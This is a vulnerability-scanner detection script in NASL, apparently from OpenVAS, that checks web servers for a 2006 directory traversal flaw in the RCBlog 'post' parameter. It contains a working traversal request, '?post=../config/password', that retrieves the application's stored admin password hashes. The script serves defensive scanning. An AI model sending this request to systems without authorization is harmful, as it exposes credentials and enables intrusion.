if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.20825" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)" );
	script_cve_id( "CVE-2006-0370", "CVE-2006-0371" );
	script_bugtraq_id( 16342 );
	script_xref( name: "OSVDB", value: "22679" );
	script_xref( name: "OSVDB", value: "22680" );
	script_xref( name: "OSVDB", value: "22681" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "RCBlog post Parameter Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2006 Josh Zlatin-Amishav" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Remove the application as its author no longer supports it." );
	script_tag( name: "summary", value: "The remote version of RCBlog fails to sanitize user-supplied
  input to the 'post' parameter of the 'index.php' script." );
	script_tag( name: "impact", value: "An attacker can use this to access arbitrary files on the remote
  host provided PHP's 'magic_quotes' setting is disabled or, regardless of that setting, files with
  a '.txt' extension such as those used by the application to store administrative credentials." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/422499" );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
file = "../config/password";
for dir in nasl_make_list_unique( "/rcblog", "/blog", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.php";
	res = http_get_cache( item: url, port: port );
	if(!res || !ContainsString( res, "powered by <a href=\"http://www.fluffington.com/\">RCBlog" )){
		continue;
	}
	url += "?post=" + file;
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(!res){
		continue;
	}
	if(!ContainsString( res, NASLString( file, " not found.</div>" ) ) && ContainsString( res, "powered by <a href=\"http://www.fluffington.com/\">RCBlog" ) && egrep( pattern: "<div class=\"title\">[a-f0-9]{32}\t[a-f0-9]{32}</div>", string: res )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

